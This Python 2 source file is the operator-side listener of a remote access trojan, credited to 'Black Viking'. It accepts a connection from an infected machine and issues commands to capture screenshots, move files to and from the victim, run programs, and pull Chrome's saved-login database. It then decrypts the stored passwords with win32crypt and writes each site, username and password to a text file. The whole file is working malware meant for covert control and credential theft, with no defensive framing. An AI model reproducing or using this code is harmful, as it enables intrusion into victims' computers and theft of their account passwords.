#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

__author__ = "Black Viking"
__date__   = "15.04.2017"

END_OF_FILE = "(((END_OF_FILE)))"

import socket
import os
import sys
import base64
import sqlite3
from colorama import init
from colorama import Fore, Back, Style
from time import *

if os.name == "nt": import win32crypt

reload(sys)
sys.setdefaultencoding("utf-8")

red     = Fore.RED
blue    = Fore.CYAN
green   = Fore.GREEN
white   = Fore.WHITE
yellow  = Fore.YELLOW
magenta = Fore.MAGENTA
bright  = Style.BRIGHT

startDir = os.getcwd()

def crypt(TEXT, encode=True):
    if encode == True:
        return base64.b64encode(TEXT)
    else:
        return base64.b64decode(TEXT)


def help():
    print bright + """
Commands:
    help()                  : Show this message.
    screenshot()            : Take a screenshot on client.
    chrome_db               : Get Chrome's password decrypted database.
    download                : Download files from client.
    upload                  : Upload files to client from server.
    message TEXT            : Show messages on target system.
    info()                  : Show target system's info.
    execute PROGRAM ARGS    : Execute programs in a new process.

Execute programs on local machine:
    :dir ==> with ":"
    :cls
    :clear"""
    
def send(data):
    global pwd
    cli.sendall(crypt(data))
    pwd = crypt(cli.recv(1024), False)
    result = crypt(cli.recv(16384), False)
    print(bright + blue + result)

def upload(command):
    fileName = command[len("upload "):]

    print yellow + bright + "[*] Upload Started!"+"\n"
    try:
        fileSize = int(int(os.path.getsize(fileName)) / 1024)
        forBar = 0
        barLen = 50.0

        f = open(fileName, 'rb')
        cli.sendall(crypt(command))
        l = f.read(1024)

        while l:
            sys.stdout.write("\r"+ bright + magenta +"[%s%s | %d%%] "%('='*int(forBar), " "*int(barLen - forBar), int(forBar * 2)))
            sys.stdout.flush()
            forBar += barLen / fileSize


            cli.send(l)
            l = f.read(1024)

        #print bright + magenta + "\r[%s | 100%%]"%("="*50)
        f.close()
        cli.send(END_OF_FILE)

        print "\n" + bright + yellow + crypt(cli.recv(1024), False)
        menu()

    except IOError:
        print red + "[!] File not found\n"


def download(command):
    cli.sendall(crypt(command))
    
    print yellow + bright + "[*] Download Started!\n"

    fileSize = int(cli.recv(1024))

    if "screenshot" in command:
        fileName = str(command[len("screenshot() download "):])
        f = open(startDir+os.sep+"screenshots"+os.sep+fileName, 'wb')
    else:
        fileName = str(command[len("download "):])
        f = open(startDir+os.sep+"downloads"+os.sep+fileName, 'wb')

    barLen = 50.0
    forBar = 0

    while True:
        l = cli.recv(1024)

        if l.startswith("File not found"):
            print red + "[!] File not found\n"
            menu()

        elif l == "[!] This func, works only on Windows!\n":
            print bright + red + l
            menu()

        else:

            while (l):

                if l.endswith(END_OF_FILE):
                    if END_OF_FILE in l:
                        l = l.replace(END_OF_FILE, "")
                    f.write(l)
                    break

                else:
                        sys.stdout.write("\r"+ bright + magenta +"[%s%s | %d%%] "%('='*int(forBar), " "*int(barLen - forBar), int(forBar * 2)))
                        sys.stdout.flush()

                        f.write(l)
                        l = cli.recv(1024)
                        forBar += barLen / fileSize

            print bright + magenta + "\r[%s | 100%%]"%("="*50)
            print "\n" + bright + yellow + "[+] Download complete!"
            print bright + yellow + "[+] %s ==> %s\n"%(fileName, f.name)
            f.close()
            break


def decrypt_db():
    #https://github.com/D4Vinci/Chrome-Extractor/blob/master/Chromer.py

    connection = sqlite3.connect(startDir+os.sep+"downloads"+os.sep+"chrome_db")
    print bright + blue + "[>] Connected to data base.."

    cursor = connection.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')

    final_data = cursor.fetchall()
    print bright + blue + "[>] Found "+str(len(final_data))+" password.."

    a=open(startDir+os.sep+"downloads"+os.sep+"chrome_db.txt","w")
    a.write("Extracted chrome passwords :\n")

    for website_data in final_data:
        password = win32crypt.CryptUnprotectData(website_data[2], None, None, None, 0)[1]
        one="Website  : "+str(website_data[0])
        two="Username : "+str(website_data[1])
        three="Password : "+str(password)
        a.write(one+"\n"+two+"\n"+three)
        a.write("\n"+" == ==="*10+"\n")

    print bright + blue + "[>] Decrypted "+str(len(final_data))+" passwords.."
    print bright + blue + "[>] Data written to %s\n"%(a.name)
    a.close()


def bind(host, port):
    global s, cli, addr, hostname, pwd
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print bright + Fore.YELLOW + "[-] Listening on ==> %s:%s\n"%(host, str(port))
    cli, addr = s.accept()


    pwd = crypt(cli.recv(1024), False)
    hostname = crypt(cli.recv(1024), False)

    print bright + magenta + "[*] Connection from ==> %s:%s\n"%(addr[0], addr[1])

def menu():
    while True:
        command = raw_input("%s[%s@%s]-[%s]~$ "%(bright + green, hostname, addr[0], pwd))
        if command == "help()":
            help()
            menu()

        elif ":" in command:
            command = command.replace(":", "")
            if command[:2].decode("utf-8") == 'cd':
                try:
                    os.chdir(command[3:].decode("utf-8"))
                    menu()
                except OSError:
                    print "%s: No such file or directory"%(command[3:])
                    menu()
                    
            else:
                os.system(command)
                menu()

        elif "upload" in command:
            upload(command)

        elif command == "screenshot()":
            command = "screenshot() download %s.png"%(str(strftime("%Y-%m-%d~%H.%M.%S", gmtime())))
            download(command)
            menu()

        elif "download" in command:
            download(command)
            menu()

        elif command == "chrome_db":
            download("download chrome_db")
            try:
                decrypt_db()
            except Exception as error:
                bright + red + "Error: %s\n"%(error)
            menu()

        elif command == "": 
            command = " "
            
        else:
            send(command)

def start(host, port):
    try:
        bind(host, port)
        menu()
    except Exception as e:
        print bright + red + "Error: %s\n"%(e)
    raw_input("\n[~] Press enter to exit...")

if __name__ == "__main__":
    init(autoreset=True)
    host = sys.argv[1]
    port = int(sys.argv[2])
    start(host, port)
